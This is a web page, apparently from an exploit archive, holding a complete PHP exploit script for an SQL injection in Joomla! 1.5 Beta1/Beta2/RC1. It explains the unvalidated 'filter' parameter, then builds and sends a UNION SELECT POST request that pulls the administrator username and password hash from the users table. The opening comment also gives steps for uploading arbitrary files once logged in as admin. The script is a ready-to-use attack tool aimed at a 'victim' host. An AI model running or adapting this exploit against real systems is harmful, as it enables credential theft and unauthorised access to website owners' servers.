<html><head><title>Joomla! 1.5 Beta1/Beta2/RC1 Remote SQL Injection Exploit</title></head><pre>#!/usr/bin/php -q -d short_open_tag=on
&lt;?php

/*

Explanation:

Although the comment points out that the &quot;filter&quot; variable is supposedly cleansed there is no 
input validation being performed except for the fact that all input is being turned into lowercase.

Affected Files:

components/com_content/models/archive.php
components/com_content/models/category.php
components/com_content/models/section.php

Code:

$filter = JRequest::getVar('filter', '', 'post');
if ($filter) {
	// clean filter variable
	$filter = JString::strtolower($filter);

	// Get the page/component configuration
	$params = &amp;$mainframe-&gt;getPageParameters();
	switch ($params-&gt;get('filter_type', 'title'))
	{
		case 'title' :
		$where .= ' AND LOWER( a.title ) LIKE \'%'.$filter.'%\'';
		break;

		case 'author' :
		$where .= ' AND ( ( LOWER( u.name ) LIKE \'%'.$filter.'%\' ) OR ( LOWER( a.created_by_alias ) LIKE \'%'.$filter.'%\' ) )';
		break;

		case 'hits' :
		$where .= ' AND a.hits LIKE \'%'.$filter.'%\'';
		break;
  	}
}
return $where;

Notes:

I found this in the first week of the 1.5 release, just wanted to see if nobody would realize
it was there and hopefully the same bug was about in FINAL, meh!

I must applaud the developers for their multi-factor authenication code they
added to the 1.5 version. For this reason I was unable to script a &quot;login -&gt; upload arbitrary 
script&quot; exploit. Maybe someone better than me can do it...who knows!

magic_quotes_gpc must be set to off in order for this script to work!

Upload Arbitrary Files:

1. Login as admin via /administrator/
2. Browse to /administrator/index.php?option=com_installer
3. In the &quot;Upload Package File&quot; section choose ANY file you wish to upload
4. Browse to /tmp/[FILE] and it's there!

*/

error_reporting(0);
ini_set(&quot;max_execution_time&quot;,0);
ini_set(&quot;default_socket_timeout&quot;,5);

if ($argc&lt;3) {
print &quot;-------------------------------------------------------------------------\r\n&quot;;
print &quot;           Joomla! 1.5 Beta1/Beta2/RC1 SQL Injection Exploit\r\n&quot;;
print &quot;-------------------------------------------------------------------------\r\n&quot;;
print &quot;Usage: ./w4ck1ng_joomla.php [HOST] [PATH] ([PREFIX] [USER_ID])\r\n\r\n&quot;;
print &quot;[HOST] 	  	= Target server's hostname or ip address\r\n&quot;;
print &quot;[PATH] 	  	= Path where Joomla is located\r\n&quot;;
print &quot;[PREFIX]	= Joomla table prefix\r\n&quot;;
print &quot;[USER_ID]  	= User ID to grab credentials for\r\n\r\n&quot;;
print &quot;e.g. ./w4ck1ng_joomla.php victim.com /joomla/\r\n&quot;;
print &quot;     ./w4ck1ng_joomla.php victim.com /joomla/ jos_ 62\r\n&quot;;
print &quot;-------------------------------------------------------------------------\r\n&quot;;
print &quot;            		 http://www.w4ck1ng.com\r\n&quot;;
print &quot;            		        ...Silentz\r\n&quot;;
print &quot;-------------------------------------------------------------------------\r\n&quot;;
die;
}

//Props to rgod for the following functions

$proxy_regex = '(\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\:\d{1,5}\b)';
function sendpacketii($packet)
{
  global $proxy, $host, $port, $html, $proxy_regex;
  if ($proxy=='') {
    $ock=fsockopen(gethostbyname($host),$port);
    if (!$ock) {
      echo 'No response from '.$host.':'.$port; die;
    }
  }
  else {
	$c = preg_match($proxy_regex,$proxy);
    if (!$c) {
      echo 'Not a valid proxy...';die;
    }
    $parts=explode(':',$proxy);
    echo &quot;Connecting to &quot;.$parts[0].&quot;:&quot;.$parts[1].&quot; proxy...\r\n&quot;;
    $ock=fsockopen($parts[0],$parts[1]);
    if (!$ock) {
      echo 'No response from proxy...';die;
	}
  }
  fputs($ock,$packet);
  if ($proxy=='') {
    $html='';
    while (!feof($ock)) {
      $html.=fgets($ock);
    }
  }
  else {
    $html='';
    while ((!feof($ock)) or (!eregi(chr(0x0d).chr(0x0a).chr(0x0d).chr(0x0a),$html))) {
      $html.=fread($ock,1);
    }
  }
  fclose($ock);
}

function make_seed()
{
   list($usec, $sec) = explode(' ', microtime());
   return (float) $sec + ((float) $usec * 100000);
}

$host = $argv[1];
$path = $argv[2];
$prefix = $argv[3];
$userid = $argv[4];
$port=80;$proxy=&quot;&quot;;

for ($i=5; $i&lt;$argc; $i++){
$temp=$argv[$i][0].$argv[$i][1];
if (($temp&lt;&gt;&quot;-p&quot;) and ($temp&lt;&gt;&quot;-P&quot;)) {$cmd.=&quot; &quot;.$argv[$i];}
if ($temp==&quot;-p&quot;)
{
  $port=str_replace(&quot;-p&quot;,&quot;&quot;,$argv[$i]);
}
if ($temp==&quot;-P&quot;)
{
  $proxy=str_replace(&quot;-P&quot;,&quot;&quot;,$argv[$i]);
}
}
if (($path[0]&lt;&gt;'/') or ($path[strlen($path)-1]&lt;&gt;'/')) {echo 'Error... check the path!'; die;}
if ($proxy=='') {$p=$path;} else {$p='http://'.$host.':'.$port.$path;}

function head(){

	print &quot;-------------------------------------------------------------------------\r\n&quot;;
	print &quot;              Joomla! 1.5 Beta1/Beta2 SQL Injection Exploit\r\n&quot;;
	print &quot;-------------------------------------------------------------------------\r\n&quot;;

}

function footer(){

	print &quot;-------------------------------------------------------------------------\r\n&quot;;
	print &quot;            		 http://www.w4ck1ng.com\r\n&quot;;
	print &quot;            		        ...Silentz\r\n&quot;;
	print &quot;-------------------------------------------------------------------------\r\n&quot;;

}

    $sql = &quot;%' UNION SELECT 0,password,0,0,0,0,0,password,0,username,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,username FROM &quot;;

	if(isset($prefix)){$sql .= $prefix;}
 	  else{$sql .= &quot;jos_&quot;;}

    $sql .= &quot;users WHERE id='&quot;;

	if(isset($userid)){$sql .= $userid;}
 	  else{$sql .= &quot;62&quot;;}

    $sql .= &quot;'/*&quot;;

    $data = &quot;filter=$sql&amp;month=&amp;year=&amp;limit=20&amp;view=archive&amp;option=com_content&quot;;

    $packet =&quot;POST &quot; . $path . &quot;index.php?option=com_content&amp;view=archive HTTP/1.1\r\n&quot;;
    $packet.=&quot;Host: &quot;.$host.&quot;\r\n&quot;;
    $packet.=&quot;Content-Type: application/x-www-form-urlencoded\r\n&quot;;
    $packet.=&quot;Content-Length: &quot;.strlen($data).&quot;\r\n&quot;;
    $packet.=&quot;User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; .NET CLR 2.0.50727;)\r\n&quot;;
    $packet.=&quot;Connection: Close\r\n\r\n&quot;;
    $packet.=$data;
    sendpacketii($packet);

    $temp = explode(&quot;Author: &quot;,$html);
    $temp2 = explode(&quot;&lt;&quot;,$temp[1]);
    $username = $temp2[0];

    $temp = explode(&quot;Created: &quot;,$html);
    $temp2 = explode(&quot;&lt;&quot;,$temp[1]);
    $hash = $temp2[0];

	head();

	if($username &amp;&amp; $hash){
	 echo &quot;[+] Admin User: &quot; . $username . &quot;\n&quot;;
	 echo &quot;[+] Admin Hash: &quot; . $hash . &quot;\n&quot;;
	}
	
	else{echo &quot;[-] Exploit Failed...\n&quot;;}

	footer();
?&gt;

# milw0rm.com [2007-09-01]</pre></html>